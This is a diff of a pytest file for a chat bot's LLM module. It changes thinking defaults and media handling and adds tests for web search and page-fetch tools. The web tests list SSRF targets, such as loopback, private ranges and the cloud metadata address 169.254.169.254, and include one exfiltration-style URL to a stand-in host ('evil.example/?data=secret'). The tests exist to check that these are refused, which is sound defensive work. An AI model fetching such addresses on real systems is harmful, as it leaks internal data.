@@ -11,7 +11,7 @@ import pytest
 import requests
 
 from core.api import Ctx, JobCtx, Module, Outcome, Role, User
-from core.testing import make_callback, make_message, not_none
+from core.testing import make_callback, make_message, not_none, printed
 from modules.external.llm import module as llm
 
 real_stream = llm.stream
@@ -202,11 +202,11 @@ def test_the_status_is_rewritten_when_it_cannot_be_deleted(chat, bot, model, mon
     assert bot.edited[-1].text == "Hello there"
 
 
-def test_thinking_is_off_by_default_and_on_when_chosen(chat, bot, model):
+def test_thinking_is_on_by_default_and_off_when_chosen(chat, bot, model):
     say(chat, "hello")
-    chat.storage.module_state.set(1, "llm", "thinking", "1")
+    chat.storage.module_state.set(1, "llm", "thinking", "0")
     say(chat, "again")
-    assert model.thinking == [False, True]
+    assert model.thinking == [True, False]
 
 
 def test_thinking_is_folded_below_the_answer(chat, bot, model):
@@ -246,22 +246,31 @@ def test_shown_thinking_leaves_out_the_instructions(chat, bot, model):
 
 
 def test_the_dots_move_while_the_model_is_silent(chat, bot, monkeypatch):
+    analyzing = {"🔍 Analyzing.", "🔍 Analyzing..", "🔍 Analyzing..."}
+    thinking = {"💭 Thinking.\n\n<i>hmm</i>", "💭 Thinking..\n\n<i>hmm</i>"}
+    writing = {"✍️ Writing.\n\nFo", "✍️ Writing..\n\nFo"}
+
+    def shown() -> set[str]:
+        return {message.text for message in bot.edited}
+
+    def until(texts: set[str]) -> None:
+        deadline = time.monotonic() + 5
+        while not texts <= shown() and time.monotonic() < deadline:
+            time.sleep(0.005)
+
     def slow(_ctx, _messages, _thinking, _tools=None):
-        time.sleep(0.1)
+        until(analyzing)
         yield "thinking", "hmm"
-        time.sleep(0.1)
+        until(thinking)
         yield "answer", "Fo"
-        time.sleep(0.1)
+        until(writing)
         yield "answer", "ur"
 
     monkeypatch.setattr(llm, "stream", slow)
     monkeypatch.setattr(llm, "tick", 0.01)
     monkeypatch.setattr(llm, "edit_every", 0.01)
     say(chat, "2+2?")
-    shown = [message.text for message in bot.edited]
-    assert {"🔍 Analyzing.", "🔍 Analyzing..", "🔍 Analyzing..."} <= set(shown)
-    assert {"💭 Thinking.\n\n<i>hmm</i>", "💭 Thinking..\n\n<i>hmm</i>"} <= set(shown)
-    assert {"✍️ Writing.\n\nFo", "✍️ Writing..\n\nFo"} <= set(shown)
+    assert analyzing <= shown() and thinking <= shown() and writing <= shown()
     assert bot.last.text.startswith("Four\n<blockquote expandable>")
 
 
@@ -435,50 +444,50 @@ def test_a_file_telegram_will_not_give_is_unreadable(chat, bot, model):
     assert model.asked == []
 
 
-def test_a_voice_message_goes_as_sound(chat, bot, model, monkeypatch):
-    bot.downloads["voice1"] = b"ogg1"
+@pytest.mark.parametrize("media", [{'voice': {'file_id': "v1", 'file_unique_id': "v1", 'duration': 4}},
+                                   {'audio': {'file_id': "a1", 'file_unique_id': "a1", 'duration': 4}},
+                                   {'video': {'file_id': "v1", 'file_unique_id': "v1", 'width': 9, 'height': 6,
+                                              'duration': 8}},
+                                   {'video_note': {'file_id': "n1", 'file_unique_id': "n1", 'length': 9,
+                                                   'duration': 8}}])
+def test_voice_and_video_messages_get_the_usual_fallback(chat, bot, model, media):
+    send(chat, media, "what is it?")
+    assert answers(bot) == ["Sorry, I do not understand... 💔"]
+    assert model.asked == [] and stored(chat) == []
+
+
+@pytest.mark.parametrize("mime", ["video/mp4", "audio/mpeg"])
+def test_a_video_or_sound_file_is_refused_before_it_is_downloaded(chat, bot, model, mime):
+    send(chat, {'document': {'file_id': "doc1", 'file_unique_id': "doc1", 'file_name': "clip",
+                             'mime_type': mime, 'file_size': 12}})
+    assert answers(bot) == ["I cannot read this kind of file yet 🤷"]
+    assert model.asked == [] and stored(chat) == []
+
+
+def gif(file_id: str = "gif1") -> dict:
+    return {'animation': {'file_id': file_id, 'file_unique_id': file_id, 'width': 9, 'height': 6, 'duration': 8}}
+
+
+def test_a_gif_goes_as_frames(chat, bot, model, monkeypatch):
+    bot.downloads["gif1"] = b"mp4"
     seen = []
 
     def convert(_ctx, data, arguments, output):
         seen.append((data, output, arguments))
-        return [b"wav1"]
+        return [b"f1", b"f2"]
 
     monkeypatch.setattr(llm, "converted", convert)
-    send(chat, {'voice': {'file_id': "voice1", 'file_unique_id': "voice1", 'duration': 4}})
-    assert seen[0][:2] == (b"ogg1", "sound.wav") and "16000" in seen[0][2]
-    assert model.asked[0][-1]['content'][1] == {'type': "input_audio",
-                                                'input_audio': {'data': base64.b64encode(b"wav1").decode(),
-                                                                'format': "wav"}}
-    assert model.asked[1][0]['content'][0]['text'].startswith("Write in one or two sentences what is said")
-
-
-def test_a_video_goes_as_frames_and_its_sound(chat, bot, model, monkeypatch):
-    bot.downloads["video1"] = b"mp4"
-    monkeypatch.setattr(llm, "converted", lambda _ctx, _data, _arguments, output:
-                        [b"f1", b"f2"] if output.startswith("frame") else [b"wav1"])
-    send(chat, {'video': {'file_id': "video1", 'file_unique_id': "video1", 'width': 9, 'height': 6, 'duration': 8}})
-    kinds = [part['type'] for part in model.asked[0][-1]['content']]
-    assert kinds == ["text", "image_url", "image_url", "input_audio"]
-
-
-def test_a_video_without_sound_still_goes_as_frames(chat, bot, model, monkeypatch):
-    bot.downloads["video1"] = b"mp4"
-
-    def convert(_ctx, _data, _arguments, output):
-        if output == "sound.wav":
-            raise llm.Unreadable("no audio stream")
-        return [b"f1"]
-
-    monkeypatch.setattr(llm, "converted", convert)
-    send(chat, {'video': {'file_id': "video1", 'file_unique_id': "video1", 'width': 9, 'height': 6, 'duration': 8}})
-    assert [part['type'] for part in model.asked[0][-1]['content']] == ["text", "image_url"]
+    send(chat, gif())
+    assert seen[0][:2] == (b"mp4", "frame%d.jpg") and "fps=4/8,scale='min(768,iw)':-2" in seen[0][2]
+    assert model.asked[0][-1]['content'][1:] == [picture(b"f1"), picture(b"f2")]
+    assert model.asked[1][0]['content'][0]['text'].startswith("Describe in one or two sentences what happens")
 
 
 def test_a_conversion_that_fails_is_unreadable(chat, bot, model, monkeypatch):
-    bot.downloads["voice1"] = b"ogg1"
+    bot.downloads["gif1"] = b"mp4"
     failed = SimpleNamespace(returncode=1, stderr=b"bad data")
     monkeypatch.setattr(llm.subprocess, "run", lambda *_args, **_values: failed)
-    send(chat, {'voice': {'file_id': "voice1", 'file_unique_id': "voice1", 'duration': 4}})
+    send(chat, gif())
     assert answers(bot) == ["I could not read this message 💔"]
     assert model.asked == []
 
@@ -487,9 +496,9 @@ def test_a_conversion_without_ffmpeg_is_unreadable(chat, bot, model, monkeypatch
     def missing(*_args, **_values):
         raise FileNotFoundError("ffmpeg")
 
-    bot.downloads["voice1"] = b"ogg1"
+    bot.downloads["gif1"] = b"mp4"
     monkeypatch.setattr(llm.subprocess, "run", missing)
-    send(chat, {'voice': {'file_id': "voice1", 'file_unique_id': "voice1", 'duration': 4}})
+    send(chat, gif())
     assert answers(bot) == ["I could not read this message 💔"]
 
 
@@ -639,12 +648,12 @@ def test_the_command_explains_and_leads_to_the_settings(chat, bot, model):
 def test_thinking_is_switched_in_the_settings(chat, bot, model):
     say(chat, "/settings")
     press(chat, "core:settings:llm")
-    assert "Thinking: <i>⚡ Without thinking</i>" in bot.last.text
+    assert "Thinking: <i>💭 With thinking</i>" in bot.last.text
     press(chat, "llm:thinking_mode")
     assert [data for _, data in bot.last.buttons][:2] == ["llm:thinking:0", "llm:thinking:1"]
-    press(chat, "llm:thinking:1")
-    assert "Thinking: <i>💭 With thinking</i>" in bot.last.text
-    assert chat.storage.module_state.get(1, "llm", "thinking") == "1"
+    press(chat, "llm:thinking:0")
+    assert "Thinking: <i>⚡ Without thinking</i>" in bot.last.text
+    assert chat.storage.module_state.get(1, "llm", "thinking") == "0"
 
 
 def test_an_unknown_thinking_choice_is_refused(chat, bot, model):
@@ -973,7 +982,7 @@ def test_the_reading_of_the_prompt_is_logged(chat, monkeypatch, capsys):
     wire(chat, monkeypatch, ['data: {"choices":[{"delta":{"content":"Hi"}}]}',
                              'data: {"choices":[],"usage":{"prompt_tokens":3469,"timing_prompt_processing":2678.1}}',
                              "data: [DONE]"])
-    assert "Prompt tokens 3469, seconds 2.68: First (1)." in capsys.readouterr().out
+    assert "Prompt tokens 3469, seconds 2.68: First (1)." in printed(capsys)
 
 
 def test_a_call_without_words_where_none_is_wanted_is_refused_once(chat, bot, model):
@@ -1001,10 +1010,9 @@ def test_thinking_off_is_asked_for_in_both_ways(chat, monkeypatch):
 def test_a_stream_with_tool_events_and_reasoning_is_read_too(chat, monkeypatch):
     _, pieces = wire(chat, monkeypatch, [
         'data: {"choices":[{"delta":{"reasoning":"so"}}]}',
-        'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"name":"search"}}]}}]}',
-        'data: {"type":"mcp_tool_result","name":"search","result":"Hi"}',
+        'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"name":"reminder_list"}}]}}]}',
         'data: {"choices":[{"delta":{"content":"Hi"}}]}', "data: [DONE]"])
-    assert pieces == [("thinking", "so"), ("tool", ""), ("tool", ""), ("answer", "Hi")]
+    assert pieces == [("thinking", "so"), ("tool", ""), ("answer", "Hi")]
 
 
 def test_the_stream_is_read_as_utf_8_whatever_the_server_claims(chat, monkeypatch):
@@ -1051,15 +1059,6 @@ def test_a_tool_call_without_an_index_is_still_read(chat, monkeypatch):
     assert pieces[-1] == ("calls", [{'id': "c1", 'name': "reminder_list", 'arguments': "{}"}])
 
 
-def test_tool_calls_of_the_server_itself_are_never_handed_over(chat, monkeypatch):
-    _, pieces = wire(chat, monkeypatch, [
-        'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"s1","function":{"name":"search",'
-        '"arguments":"{}"}}]},"finish_reason":"tool_calls"}]}',
-        'data: {"type":"mcp_tool_result","name":"search","result":"Hi"}',
-        'data: {"choices":[{"delta":{"content":"Hi"},"finish_reason":"stop"}]}', "data: [DONE]"])
-    assert pieces == [("tool", ""), ("tool", ""), ("answer", "Hi")]
-
-
 def test_tool_calls_count_only_when_the_round_ends_for_them(chat, monkeypatch):
     _, pieces = wire(chat, monkeypatch, [
         'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"c1","function":{"name":"reminder_list"}}]}}]}',
@@ -1084,6 +1083,9 @@ def test_tools_are_sent_only_when_there_are_some(chat, monkeypatch):
 
 
 # ----- the assistant -----
+
+web_tools = ["llm_search", "llm_fetch"]
+
 
 def calls(*wanted: tuple[str, dict | str]) -> list[tuple]:
     return [("tool", ""), ("calls", [{'id': "call_" + str(number), 'name': name,
@@ -1163,8 +1165,8 @@ def test_the_prompt_is_in_the_language_of_the_user(chat, bot, model):
 
 def test_the_actions_go_as_tools(chat, bot, model):
     say(chat, "hello")
-    assert tool_names(model) == ["reminder_add", "reminder_list", "reminder_edit", "reminder_delete"]
-    adding = not_none(model.tools[0])[0]['function']
+    assert tool_names(model) == web_tools + ["reminder_add", "reminder_list", "reminder_edit", "reminder_delete"]
+    adding = not_none(model.tools[0])[2]['function']
     assert adding['description'] == "Sets a reminder for the user, who confirms it with a button"
     assert adding['parameters'] == {
         'type': "object", 'required': ["content", "date"],
@@ -1173,7 +1175,7 @@ def test_the_actions_go_as_tools(chat, bot, model):
                                 'description': "When to remind, in the local time, as YYYY-MM-DD HH:MM or "
                                                "DD.MM.YYYY HH:MM"}}}
     assert "With the tools you act in these modules" in model.systems[0]
-    editing = not_none(model.tools[0])[2]['function']['parameters']
+    editing = not_none(model.tools[0])[4]['function']['parameters']
     assert list(editing['properties']) == ["reminder_id", "content", "date"]
     assert editing['required'] == ["reminder_id"]
 
@@ -1340,7 +1342,7 @@ def test_without_access_to_a_module_its_actions_and_context_stay_away(chat, bot,
     chat.storage.access.allow(1, "reminder", False)
     model.script = [calls(("reminder_list", {})), [("answer", "No.")]]
     say(chat, "list them")
-    assert tool_names(model) == []
+    assert tool_names(model) == web_tools
     assert "/reminder" not in model.systems[0] and "With the tools" not in model.systems[0]
     assert len(model.asked) == 1
 
@@ -1365,10 +1367,10 @@ def test_a_module_switched_off_in_the_settings_gives_nothing(chat, bot, model):
     press(chat, "llm:share:reminder")
     assert bot.last.buttons[0] == ("⬜ 🔔 Reminders", "llm:share:reminder")
     say(chat, "what is next?")
-    assert tool_names(model, -1) == [] and model.contexts[-1] == []
+    assert tool_names(model, -1) == web_tools and model.contexts[-1] == []
     press(chat, "llm:share:reminder")
     say(chat, "and now?")
-    assert tool_names(model, -1) == ["reminder_add", "reminder_list", "reminder_edit", "reminder_delete"]
+    assert tool_names(model, -1) == web_tools + ["reminder_add", "reminder_list", "reminder_edit", "reminder_delete"]
     assert "The next reminders" in model.contexts[-1][-1]
 
 
@@ -1540,16 +1542,6 @@ def test_the_outcome_comes_as_a_new_message_when_the_question_cannot_be_rewritte
     assert len(reminders(chat)) == 1
 
 
-def test_our_call_after_a_server_search_needs_its_own_end_for_tools(chat, monkeypatch):
-    _, pieces = wire(chat, monkeypatch, [
-        'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"s1","function":{"name":"search"}}]},'
-        '"finish_reason":"tool_calls"}]}',
-        'data: {"type":"mcp_tool_result","name":"search","result":"Hi"}',
-        'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"c1","function":{"name":"reminder_list"}}]}}]}',
-        "data: [DONE]"])
-    assert [kind for kind, _ in pieces] == ["tool", "tool", "tool"]
-
-
 def test_calls_without_an_id_get_ids_that_never_repeat(chat, monkeypatch):
     lines = ['data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"name":"reminder_list"}},'
              '{"index":1,"function":{"name":"reminder_list"}}]},"finish_reason":"tool_calls"}]}', "data: [DONE]"]
@@ -1613,3 +1605,342 @@ def test_old_confirmations_are_forgotten_when_a_new_one_comes(chat, bot, model):
     say(chat, "remind me tomorrow")
     keys = [key for key in chat.storage.module_state.get_all(1, "llm") if key.startswith("action.")]
     assert len(keys) == 1 and keys[0] not in ("action.stale", "action.unknown")
+
+
+# ----- web -----
+
+public = "93.184.216.34"
+
+
+class Page:
+    def __init__(self, status: int = 200, text: str = ""):
+        self.status_code, self.text = status, text
+
+    def raise_for_status(self):
+        if self.status_code >= 400:
+            raise requests.HTTPError(str(self.status_code))
+
+
+class Got:
+    def __init__(self, body: bytes = b"", kind: str = "text/html; charset=utf-8", status: int = 200,
+                 location: str = "", peer: str = public):
+        self.status_code, self.body, self.is_redirect = status, body, bool(location)
+        self.headers = {'content-type': kind} | ({'location': location} if location else {})
+        self.raw = SimpleNamespace(connection=SimpleNamespace(sock=SimpleNamespace(getpeername=lambda: (peer, 443))))
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *_):
+        return False
+
+    def iter_content(self, size: int):
+        return iter(self.body[start:start + size] for start in range(0, len(self.body), size))
+
+
+class Web:
+    def __init__(self):
+        self.hosts: dict[str, list[str]] = {}
+        self.pages: dict[str, Got] = {}
+        self.found = Page(text=results_page(("https://example.com/news?id=1", "Example news", "Fresh news")))
+        self.bing = Page(text="<html><body></body></html>")
+        self.searches: list[dict] = []
+        self.opened: list[str] = []
+        self.sessions: list = []
+
+    def resolve(self, host, port, **options):
+        if self.hosts.get(host) == []:
+            raise OSError("no such host")
+        addresses = self.hosts.get(host) or ([host] if re.fullmatch(r"[\d.]+|[0-9a-f:]+", host) else [public])
+        return [(2, options.get('type', 0), 6, "", (address, port)) for address in addresses]
+
+    def post(self, url, **options):
+        self.searches.append({'url': url} | options)
+        if isinstance(self.found, Exception):
+            raise self.found
+        return self.found
+
+    def get(self, url, **options):
+        self.searches.append({'url': url} | options)
+        if isinstance(self.bing, Exception):
+            raise self.bing
+        return self.bing
+
+    def session(self):
+        web = self
+
+        class Session:
+            trust_env = True
+
+            def __enter__(self):
+                web.sessions.append(self)
+                return self
+
+            def __exit__(self, *_):
+                return False
+
+            @staticmethod
+            def get(url, **_options):
+                web.opened.append(url)
+                return web.pages[url]
+
+        return Session()
+
+
+def results_page(*found: tuple[str, str, str]) -> str:
+    return "<html><body>" + "".join(
+        '<div class="result"><h2 class="result__title"><a href="//duckduckgo.com/l/?uddg=' +
+        requests.utils.quote(url, safe="") + '&rut=x">' + title + '</a></h2><a class="result__snippet">' + snippet +
+        "</a></div>" for url, title, snippet in found) + "</body></html>"
+
+
+def bing_page(*found: tuple[str, str, str]) -> str:
+    return "<html><body><ol>" + "".join(
+        '<li class="b_algo"><h2><a href="https://www.bing.com/ck/a?!&&p=1&u=a1' +
+        base64.urlsafe_b64encode(url.encode()).decode().rstrip("=") + '&ntb=1">' + title +
+        '</a></h2><div class="b_caption"><p>' + snippet + "</p></div></li>" for url, title, snippet in found) + \
+        '<li class="b_algo"><h2><a href="https://www.bing.com/aclick?ld=1">Ad</a></h2></li></ol></body></html>'
+
+
+def article(text: str = "The main story. " * 20) -> bytes:
+    return ("<html><head><title>  The  story </title><script>var secret = 1;</script></head><body>"
+            "<nav>Home | News</nav><header>Site</header><article><h1>Headline</h1><p>" + text + "</p></article>"
+            "<aside>Ads</aside><footer>Contact</footer></body></html>").encode()
+
+
+@pytest.fixture
+def web(monkeypatch) -> Web:
+    fake = Web()
+    monkeypatch.setattr(llm, "search_gap", 0)
+    monkeypatch.setattr(llm.socket, "getaddrinfo", fake.resolve)
+    monkeypatch.setattr("modules.external.llm.module.requests.Session", fake.session)
+    monkeypatch.setattr("modules.external.llm.module.requests.post", fake.post)
+    monkeypatch.setattr("modules.external.llm.module.requests.get", fake.get)
+    return fake
+
+
+def used(chat, model, text: str, *rounds: tuple[str, dict]) -> list[dict]:
+    model.script = [calls(one) for one in rounds] + [[("answer", "Done")]]
+    say(chat, text)
+    return [results(model, number)[-1] for number in range(1, len(rounds) + 1)]
+
+
+@pytest.mark.parametrize("address, is_open", [
+    ("127.0.0.1", False), ("10.1.2.3", False), ("172.16.0.1", False), ("192.168.0.2", False),
+    ("169.254.169.254", False), ("100.64.0.1", False), ("0.0.0.0", False), ("224.0.0.1", False), ("::1", False),
+    ("fe80::1%en0", False), ("fd00::1", False), ("::ffff:127.0.0.1", False), ("::ffff:192.168.0.2", False),
+    ("not an address", False), ("", False), (public, True), ("2606:4700::1111", True)])
+def test_only_public_addresses_count_as_public(address, is_open):
+    assert llm.is_public(address) is is_open
+
+
+def test_the_search_results_are_read_from_the_page():
+    page = results_page(("https://example.com/a?b=1&c=2", "First  <b>one</b>", "Short   text"),
+                        ("https://second.org/", "Second", "")) + \
+        '<div class="result result--ad"><h2 class="result__title"><a href="https://ads.com/">Ad</a></h2></div>' \
+        '<div class="result"><h2 class="result__title"><a href="https://duckduckgo.com/y.js?ad=1">Ad</a></h2></div>'
+    assert llm.results_from(page, ".result:not(.result--ad)", ".result__title a", ".result__snippet") == [
+        {'title': "First one", 'url': "https://example.com/a?b=1&c=2", 'snippet': "Short text"},
+        {'title': "Second", 'url': "https://second.org/", 'snippet': ""}]
+
+
+def test_a_search_keeps_the_best_five():
+    sites = ["https://site" + str(number) + ".com/" for number in range(8)]
+    page = results_page(*[(site, "Site", "") for site in sites])
+    found = llm.results_from(page, ".result:not(.result--ad)", ".result__title a", ".result__snippet")
+    assert [one['url'] for one in found] == sites[:5]
+
+
+def test_a_search_goes_to_duckduckgo_in_the_language_of_the_user(chat, model, web):
+    said = used(chat, model, "what is new?", ("llm_search", {'query': " news "}))
+    assert web.searches[0]['url'] == "https://html.duckduckgo.com/html/"
+    assert web.searches[0]['data'] == {'q': "news", 'kl': "us-en", 'kp': "-1"}
+    assert web.searches[0]['headers']['Accept-Language'] == "en-US,en;q=0.9"
+    assert said == [{'status': "done", 'result': [{'title': "Example news", 'url': "https://example.com/news?id=1",
+                                                   'snippet': "Fresh news"}]}]
+    assert len(web.searches) == 1
+
+
+def test_bing_results_are_read_from_the_page():
+    page = bing_page(("https://example.com/żółw?a=1", "First  one", "Short   text"), ("https://second.org/", "Two", ""))
+    assert llm.results_from(page, "li.b_algo", "h2 a", "p") == [
+        {'title': "First one", 'url': "https://example.com/żółw?a=1", 'snippet': "Short text"},
+        {'title': "Two", 'url': "https://second.org/", 'snippet': ""}]
+
+
+def test_only_the_real_hosts_of_the_engines_are_unwrapped_and_skipped():
+    hidden = base64.urlsafe_b64encode(b"https://example.com/").decode().rstrip("=")
+    lookalikes = ["https://evilbing.com/ck/a?u=a1" + hidden, "https://x.com:1@bing.com.evil.org/?u=a1" + hidden,
+                  "https://notduckduckgo.com/l/?uddg=https%3A%2F%2Fa.com"]
+    assert [llm.unwrapped(link) for link in lookalikes] == lookalikes
+    assert llm.unwrapped("https://www.bing.com/ck/a?u=a1" + hidden) == "https://example.com/"
+    page = bing_page(("https://notbing.com/", "Real", ""), ("https://www.bing.com/maps", "Maps", ""))
+    assert [found['url'] for found in llm.results_from(page, "li.b_algo", "h2 a", "p")] == ["https://notbing.com/"]
+
+
+def test_bing_searches_when_duckduckgo_refuses(chat, model, web):
+    web.found = Page(202)
+    web.bing = Page(text=bing_page(("https://example.com/b", "From Bing", "Found")))
+    said = used(chat, model, "news?", ("llm_search", {'query': "news"}))
+    assert [one['url'] for one in web.searches] == ["https://html.duckduckgo.com/html/", "https://www.bing.com/search"]
+    assert web.searches[1]['params'] == {'q': "news", 'setlang': "en", 'cc': "us"}
+    assert said[0]['result'] == [{'title': "From Bing", 'url': "https://example.com/b", 'snippet': "Found"}]
+
+
+def test_bing_searches_when_duckduckgo_finds_nothing(chat, model, web):
+    web.found = Page(200, "<html><body>No results.</body></html>")
+    web.bing = Page(text=bing_page(("https://example.com/b", "From Bing", "")))
+    assert used(chat, model, "news?", ("llm_search", {'query': "news"}))[0]['status'] == "done"
+
+
+@pytest.mark.parametrize("found, bing, problem", [
+    (Page(202), Page(429), "The search engine is not taking questions right now - try later"),
+    (Page(200, "<html>anomaly detected</html>"), Page(403),
+     "The search engine is not taking questions right now - try later"),
+    (Page(403), Page(200, "<html></html>"), "The search found nothing"),
+    (Page(200, "<html><body>No results.</body></html>"), Page(200, "<html></html>"), "The search found nothing"),
+    (Page(500), Page(500), "The page or the search engine did not answer"),
+    (requests.ConnectionError("down"), requests.Timeout("slow"), "The page or the search engine did not answer")])
+def test_a_search_that_gives_nothing_is_refused(chat, model, web, found, bing, problem):
+    web.found, web.bing = found, bing
+    assert used(chat, model, "news?", ("llm_search", {'query': "news"})) == [{'status': "refused",
+                                                                              'problem': problem}]
+
+
+def test_a_page_from_the_search_results_is_read(chat, model, web):
+    web.pages["https://example.com/news?id=1"] = Got(article())
+    said = used(chat, model, "what is new?", ("llm_search", {'query': "news"}),
+                ("llm_fetch", {'url': "https://example.com/news?id=1#top"}))[-1]
+    assert said['status'] == "done"
+    assert said['result'] | {'text': ""} == {'url': "https://example.com/news?id=1", 'title': "The story", 'part': 1,
+                                             'parts': 1, 'text': ""}
+    assert said['result']['text'].startswith("Headline\nThe main story.")
+    assert all(word not in said['result']['text'] for word in ("secret", "Home", "Site", "Ads", "Contact"))
+    assert web.sessions[0].trust_env is False
+
+
+def test_a_page_the_user_sent_is_read(chat, model, web):
+    web.pages["https://example.com/a"] = Got(b"plain words", kind="text/plain")
+    said = used(chat, model, "what is on https://example.com/a?", ("llm_fetch", {'url': "https://example.com/a"}))
+    assert said[0]['result'] == {'url': "https://example.com/a", 'title': "", 'part': 1, 'parts': 1,
+                                 'text': "plain words"}
+
+
+def test_an_address_never_seen_is_never_opened(chat, model, web):
+    said = used(chat, model, "hi", ("llm_fetch", {'url': "https://evil.example/?data=secret"}))
+    assert said == [{'status': "refused", 'problem': "Only addresses from the search results or from the user are "
+                                                     "opened - search first"}]
+    assert web.opened == []
+
+
+# noinspection HttpUrlsUsage
+@pytest.mark.parametrize("url", ["http://localhost/", "http://192.168.0.2:8001/v1", "http://169.254.169.254/latest",
+                                 "http://[::1]/", "http://2130706433/", "http://mixed.example/"])
+def test_an_address_in_the_local_network_is_never_opened(chat, model, web, url):
+    web.hosts.update({'localhost': ["127.0.0.1"], '2130706433': ["127.0.0.1"], 'mixed.example': [public, "10.0.0.5"]})
+    said = used(chat, model, "look at " + url, ("llm_fetch", {'url': url}))
+    assert said == [{'status': "refused", 'problem': "This address leads to a local network, which is never opened"}]
+    assert web.opened == []
+
+
+# noinspection HttpUrlsUsage
+def test_a_redirect_into_the_local_network_is_refused(chat, model, web):
+    web.pages["https://example.com/a"] = Got(status=302, location="http://192.168.0.2/admin")
+    said = used(chat, model, "read https://example.com/a", ("llm_fetch", {'url': "https://example.com/a"}))
+    assert said[0]['problem'] == "This address leads to a local network, which is never opened"
+    assert web.opened == ["https://example.com/a"]
+
+
+def test_a_redirect_to_another_public_page_is_followed(chat, model, web):
+    web.pages["https://example.com/a"] = Got(status=301, location="/b")
+    web.pages["https://example.com/b"] = Got(b"moved here", kind="text/plain")
+    said = used(chat, model, "read https://example.com/a", ("llm_fetch", {'url': "https://example.com/a"}))
+    assert said[0]['result']['url'] == "https://example.com/b" and said[0]['result']['text'] == "moved here"
+    assert "https://example.com/b" in llm.json.loads(chat.storage.module_state.get(1, "llm", "seen"))
+
+
+def test_a_connection_that_lands_in_the_local_network_is_dropped(chat, model, web):
+    web.pages["https://example.com/a"] = Got(b"router admin", peer="192.168.0.1")
+    said = used(chat, model, "read https://example.com/a", ("llm_fetch", {'url': "https://example.com/a"}))
+    assert said[0]['problem'] == "This address leads to a local network, which is never opened"
+
+
+@pytest.mark.parametrize("page, problem", [
+    (Got(b"%PDF", kind="application/pdf"), "This page is neither text nor HTML, so it cannot be read"),
+    (Got(status=404), "The page answered with error 404"),
+    (Got(status=302, location="https://example.com/a"), "The page redirects too many times"),
+    (Got(b"<html><body><script>app()</script></body></html>"), "There is no text on this page")])
+def test_a_page_that_cannot_be_read_is_refused(chat, model, web, page, problem):
+    web.pages["https://example.com/a"] = page
+    said = used(chat, model, "read https://example.com/a", ("llm_fetch", {'url': "https://example.com/a"}))
+    assert said == [{'status': "refused", 'problem': problem}]
+
+
+def test_a_page_that_does_not_answer_is_refused(chat, model, web):
+    web.hosts['gone.example'] = []
+    said = used(chat, model, "read https://gone.example/", ("llm_fetch", {'url': "https://gone.example/"}))
+    assert said[0]['problem'] == "The page or the search engine did not answer"
+
+
+# noinspection HttpUrlsUsage
+@pytest.mark.parametrize("url", ["ftp://example.com/file", "https://user:secret@example.com/", "https:///nothing",
+                                 "http://example.com:99999/"])
+def test_only_plain_web_addresses_are_opened(url):
+    with pytest.raises(llm.Blocked) as caught:
+        llm.checked(url)
+    assert caught.value.key == "address"
+
+
+def test_a_long_page_comes_in_parts(chat, model, web):
+    text = "\n".join("Line " + str(number) + " " + "x" * 90 for number in range(100))
+    web.pages["https://example.com/a"] = Got(text.encode(), kind="text/plain")
+    said = used(chat, model, "read https://example.com/a", ("llm_fetch", {'url': "https://example.com/a"}),
+                ("llm_fetch", {'url': "https://example.com/a", 'part': 2}),
+                ("llm_fetch", {'url': "https://example.com/a", 'part': 3}))
+    first, second = said[0]['result'], said[1]['result']
+    assert (first['part'], first['parts'], second['part']) == (1, 2, 2)
+    assert first['text'].startswith("Line 0 ") and second['text'].endswith("Line 99 " + "x" * 90)
+    assert len(first['text']) <= llm.web_part and first['text'] + "\n" + second['text'] == text
+    assert said[2] == {'status': "refused", 'problem': "This page has only this many parts - 2"}
+
+
+def test_a_huge_page_is_read_only_up_to_the_limit(monkeypatch):
+    monkeypatch.setattr(llm, "web_size", 100)
+    assert len(llm.body_of(Got(b"x" * 1000))) == 100  # type: ignore[arg-type]
+
+
+def test_the_main_part_of_a_page_is_read():
+    title, text = llm.page_text(article("Story " * 50), "text/html")
+    assert title == "The story" and text.startswith("Headline\nStory Story")
+    short = b"<html><body><nav>Menu</nav><main>Too short</main><p>Body <b>text</b>, inline</p></body></html>"
+    assert llm.page_text(short, "text/html") == ("", "Too short\nBody text, inline")
+    table = b"<table><tr><th>Code</th><th>Rate</th></tr><tr><td>EUR</td><td>4,4673</td></tr></table>"
+    assert llm.page_text(table, "text/html")[1] == "Code | Rate |\nEUR | 4,4673 |"
+
+
+def test_a_long_result_is_kept_short_in_the_history(chat, model, web):
+    text = "\n".join("Line " + str(number) + " " + "x" * 90 for number in range(50))
+    web.pages["https://example.com/a"] = Got(text.encode(), kind="text/plain")
+    said = used(chat, model, "read https://example.com/a", ("llm_fetch", {'url': "https://example.com/a"}))
+    assert said[0]['result']['text'] == text
+    action = next(json.loads(content) for _, role, content in stored(chat) if role == "action")
+    assert action['said']['cut'] is True and len(action['said']['result']) == llm.kept_size
+    say(chat, "and?")
+    replayed = [one for one in model.asked[-1] if one['role'] == "tool"]
+    assert json.loads(replayed[0]['content'])['cut'] is True
+
+
+def test_a_short_result_is_kept_whole_in_the_history():
+    said = {'status': "done", 'result': [{'title': "A", 'url': "https://a.com/"}]}
+    assert llm.for_history(said) is said
+    assert llm.for_history({'status': "refused", 'problem': "x" * 5000})['problem'] == "x" * 5000
+
+
+def test_the_web_rules_come_with_the_web_tools_only(chat, bot, model, monkeypatch):
+    say(chat, "hello")
+    assert "With the web tools you search the web" in model.systems[-1]
+    assert "Count relative times (in 20 minutes, tomorrow, on Monday)" in model.systems[-1]
+    offered = llm.offered
+    monkeypatch.setattr(llm, "offered", lambda ctx: [pair for pair in offered(ctx) if pair[0].name != "llm"])
+    say(chat, "again")
+    assert "With the web tools" not in model.systems[-1] and "With the tools you act" in model.systems[-1]
